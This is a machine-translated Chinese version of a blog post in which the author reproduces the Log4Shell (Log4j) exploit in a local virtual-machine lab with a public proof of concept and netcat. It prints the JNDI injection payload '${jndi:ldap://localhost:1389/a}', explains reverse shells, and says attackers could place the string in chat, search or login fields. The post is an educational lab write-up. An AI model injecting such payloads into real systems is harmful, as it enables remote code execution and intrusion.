<html>
<head>
<title>Simulating the Log4j Exploit to Hack a Server</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">模拟Log4j漏洞攻击服务器</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/simulating-the-log4j-exploit-to-hack-a-server-2d52269b2165?source=collection_archive---------7-----------------------#2022-01-04">https://levelup.gitconnected.com/simulating-the-log4j-exploit-to-hack-a-server-2d52269b2165?source=collection_archive---------7-----------------------#2022-01-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/c6ad1320b1dddc750006d7a19a26394b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*owXEaRJGtAEHRFa-Jaa7Xw.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">米歇尔·勒恩斯在<a class="ae kc" href="https://unsplash.com/s/photos/java?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片。一张写着“log4shell”的图片本来是要花钱的，所以这里有一张Java的图片。</figcaption></figure><p id="613e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">大约两周前，我写了一篇关于Log4Shell 和有人如何在GitHub上创建一个漏洞利用的开源模拟的<a class="ae kc" href="https://evan-soohoo.medium.com/log4j-log4shell-a-software-feature-with-unintended-consequences-2b6441c1b265?source=user_profile---------1-------------------------------" rel="noopener">通用帖子。我写道，他们的库是打算在Ubuntu等Linux发行版上运行的，尽管我确实创建了一个分支</a><a class="ae kc" href="https://github.com/EvanSooHoo/log4j-shell-poc" rel="noopener ugc nofollow" target="_blank">和一些为Mac OSX操作系统更新的路径。今天，我得到了利用Ubuntu工作。</a></p><p id="3b16" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">关于Log4j漏洞的讨论仍在继续，特别是一个非常全面的计算机爱好者视频。这个频道的主持人详细讨论了JNDI，编写了一个示例Spring Boot应用程序来强调依赖性，然后进行了一个关于开源的优点和缺点的更一般的对话。</p><h1 id="4307" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">实验继续进行</h1><figure class="lz ma mb mc gt jr"><div class="bz fp l di"><div class="md me l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">这个视频已经有点过时了；脚本已经过微妙的修改，这反映在自述文件中</figcaption></figure><p id="2473" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">VirtualBox 是一款免费的虚拟机管理程序，可以用于虚拟机。<em class="mf">黑客行动手册</em>建议您使用虚拟化来设置Kali和Metasploitable，分别用于进攻和目标练习，尽管我将是第一个承认我没有读完整本书<a class="ae kc" href="https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing/dp/1494932636" rel="noopener ugc nofollow" target="_blank">。对于这个练习，Kali和Metasploitable无关紧要…但是我确实认为这种测试环境是一个好主意。你可以免费使用VirtualBox、Metasploitable和Kali我们为此感谢开源。</a></p><p id="e814" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">根据IBM的一篇文章:</p><blockquote class="mg mh mi"><p id="9430" class="kd ke mf kf b kg kh ki kj kk kl km kn mj kp kq kr mk kt ku kv ml kx ky kz la ij bi translated">虚拟化使用软件在计算机硬件上创建一个抽象层，允许将单台计算机的硬件元素(处理器、内存、存储等)划分到多个虚拟计算机中，通常称为虚拟机(VM)。每个虚拟机都运行自己的操作系统(OS ),表现得像一台独立的计算机，即使它只运行在实际底层计算机硬件的一部分上…</p><p id="e7ca" class="kd ke mf kf b kg kh ki kj kk kl km kn mj kp kq kr mk kt ku kv ml kx ky kz la ij bi translated"><strong class="kf ir">第2类虚拟机管理程序</strong>在现有操作系统上作为应用程序运行。最常用于端点设备上运行替代操作系统，它们会带来性能开销，因为它们必须使用主机操作系统来访问和协调底层硬件资源。</p></blockquote><p id="3de3" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我在一个外置硬盘上通过VirtualBox运行Ubuntu。我分配了大量的磁盘空间，因为增加硬盘大小并不像你想象的那么简单<a class="ae kc" href="https://askubuntu.com/questions/88647/how-do-i-increase-the-hard-disk-size-of-the-virtual-machine" rel="noopener ugc nofollow" target="_blank"/>。我尝试定期拍摄快照，这在虚拟机世界中可以被认为有点像视频游戏保存点。</p><figure class="lz ma mb mc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/7c59b2ed4abaf9d09f3fc472d4641e90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gDyHkjhhEUaua03qyM-oVg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">在左边，我在一个文本字段中输入$ { JNDI:LDAP://localhost:1389/a }。在右边，我控制了一个假想的服务器(这只是概念验证中的127.0.0.1 ),然后能够运行任意命令，比如<em class="mn"> ls </em></figcaption></figure><h2 id="9efb" class="mo lc iq bd ld mp mq dn lh mr ms dp ll ko mt mu lp ks mv mw lt kw mx my lx mz bi">127.0.0.1</h2><p id="bf86" class="pw-post-body-paragraph kd ke iq kf b kg na ki kj kk nb km kn ko nc kq kr ks nd ku kv kw ne ky kz la ij bi translated">在软件行业，我有一个很讨厌的事情，那就是当人们指责你不知道某事，而不是花十秒钟向你解释它。127.0.0.1 <a class="ae kc" href="https://www.lifewire.com/network-computer-special-ip-address-818385" rel="noopener ugc nofollow" target="_blank">称为本地主机或回送地址</a> —所有计算机都将此地址作为自己的地址，应用软件通常使用此地址进行测试。</p><p id="cc27" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">严格来说，<a class="ae kc" href="https://stackoverflow.com/questions/7382602/what-is-the-difference-between-127-0-0-1-and-localhost" rel="noopener ugc nofollow" target="_blank"> 127.0.0.1和localhost并不意味着完全相同的东西</a>…但它们通常解析为相同的东西。localhost有用的一个例子是在web开发中；您可以使用<em class="mf"> npm运行serve，</em>然后在一个端口上检查localhost，以查看您的网站实际托管在您的机器之外时的样子。</p><h2 id="3b9e" class="mo lc iq bd ld mp mq dn lh mr ms dp ll ko mt mu lp ks mv mw lt kw mx my lx mz bi translated">netcat</h2><p id="b75b" class="pw-post-body-paragraph kd ke iq kf b kg na ki kj kk nb km kn ko nc kq kr ks nd ku kv kw ne ky kz la ij bi translated"><a class="ae kc" href="https://en.wikipedia.org/wiki/Netcat" rel="noopener ugc nofollow" target="_blank"> Netcat是一个计算机网络实用程序</a>。您可以使用它来“监听”一个端口，并且可以使用Netcat创建一个反向shell。根据<a class="ae kc" href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/" rel="noopener ugc nofollow" target="_blank">网上的这篇文章</a>:</p><blockquote class="mg mh mi"><p id="ae80" class="kd ke mf kf b kg kh ki kj kk kl km kn mj kp kq kr mk kt ku kv ml kx ky kz la ij bi translated">反向外壳是在连接上建立的外壳会话，从远程机器发起，而不是从攻击者的主机发起。成功利用远程命令执行漏洞的攻击者可以使用反向外壳获取目标机器上的交互式外壳会话，并继续他们的攻击。反向外壳还可以跨越NAT或防火墙。本文解释了反向shells在实践中是如何工作的，以及您可以做些什么来防止它们…</p></blockquote><p id="ca08" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">反向外壳有合法的管理员用途，但也是黑客的绝佳工具。它们代表了将要执行的任意和/或恶意命令的访问点，这正是Log4shell概念验证中所发生的情况。</p><h2 id="ee47" class="mo lc iq bd ld mp mq dn lh mr ms dp ll ko mt mu lp ks mv mw lt kw mx my lx mz bi translated">码头工人</h2><p id="cb7c" class="pw-post-body-paragraph kd ke iq kf b kg na ki kj kk nb km kn ko nc kq kr ks nd ku kv kw ne ky kz la ij bi translated">你可以下载一个单独的目标应用程序，就像他们在上面的hak5视频中所做的那样，但是<a class="ae kc" href="https://docs.docker.com/get-started/overview/" rel="noopener ugc nofollow" target="_blank"> Docker </a>让事情变得简单了一些。您可以部署一个容器，这可能比其他方法更快。Docker没有过多地讨论可能是它自己的帖子的主题，而是帮助软件开发人员解决环境设置问题，这可能是业界最令人沮丧的障碍之一。</p><h2 id="23a1" class="mo lc iq bd ld mp mq dn lh mr ms dp ll ko mt mu lp ks mv mw lt kw mx my lx mz bi translated">最终注释</h2><ul class=""><li id="0385" class="nf ng iq kf b kg na kk nb ko nh ks ni kw nj la nk nl nm nn bi translated">我举的例子最像github 上的<a class="ae kc" href="https://github.com/kozmer/log4j-shell-poc" rel="noopener ugc nofollow" target="_blank">第一个视频，但是我可以使用netcat</a></li><li id="b17d" class="nf ng iq kf b kg no kk np ko nq ks nr kw ns la nk nl nm nn bi translated">我有一个正在进行的“笑话”，在这个笑话中，我给人们发了“$ { JNDI:LDAP://localhost:1389/a }”消息，说我正在黑他们。现实生活中的黑客要比这复杂得多，但只是一点点。攻击者可以把这个放进《我的世界》的聊天室。攻击者可以将它放入桌面应用程序的搜索栏中。攻击者可以将其放入登录页面的用户字段。现实生活中的黑客不会使用本地主机，尽管……“本地主机”可能是他们拥有的外部设备的IP</li><li id="a6b7" class="nf ng iq kf b kg no kk np ko nq ks nr kw ns la nk nl nm nn bi translated">这项工作由一个名为Exploit.java的40行Java文件完成，该漏洞允许您运行该文件</li><li id="bd4b" class="nf ng iq kf b kg no kk np ko nq ks nr kw ns la nk nl nm nn bi translated">获取易受攻击的Java版本花了我一分钟的时间。我下载了错误的版本，并花了一段时间来找出问题所在。我知道我并不孤单，因为<a class="ae kc" href="https://github.com/kozmer/log4j-shell-poc/issues?q=is%3Aissue+is%3Aclosed" rel="noopener ugc nofollow" target="_blank">我浏览了一些问题</a></li><li id="617c" class="nf ng iq kf b kg no kk np ko nq ks nr kw ns la nk nl nm nn bi translated">当这个概念证明有效时，这是非常明显的。您运行netcat的窗口将成功建立连接，您将可以自由地运行<em class="mf"> ls </em>和任何您想尝试的东西</li></ul><h1 id="1dc8" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">更长的讨论</h1><figure class="lz ma mb mc gt jr"><div class="bz fp l di"><div class="md me l"/></div></figure><p id="2b25" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">《计算机爱好者》的主持人详细讲述了JNDI，然后迈克讲述了他自己易受攻击的研究应用程序，并编写了简单的Java代码来阐述他的观点。他们花了大约半个小时谈论软件开发，而不是网络安全。</p><p id="8aed" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">首先，与此相关的一切都是一个有意的<em class="mf">特性</em>的结果。他们敦促软件开发人员尽量保持简单，不要添加不必要的东西，除非他们决定建立一个全新的库。但是开源软件，用他们的话说，是一把双刃剑。这可能是某人作为业余爱好开发的。这个功能大概是出于好意，免费送给全世界的。</p><p id="9fca" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">可惜没人赢。修补这是一个痛苦。</p><h1 id="4490" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">结束语</h1><p id="b73b" class="pw-post-body-paragraph kd ke iq kf b kg na ki kj kk nb km kn ko nc kq kr ks nd ku kv kw ne ky kz la ij bi translated">我不确定在这里放什么，所以这里有两只柯基犬在玩绳球。</p><figure class="lz ma mb mc gt jr"><div class="bz fp l di"><div class="nt me l"/></div></figure></div></div>    
</body>
</html>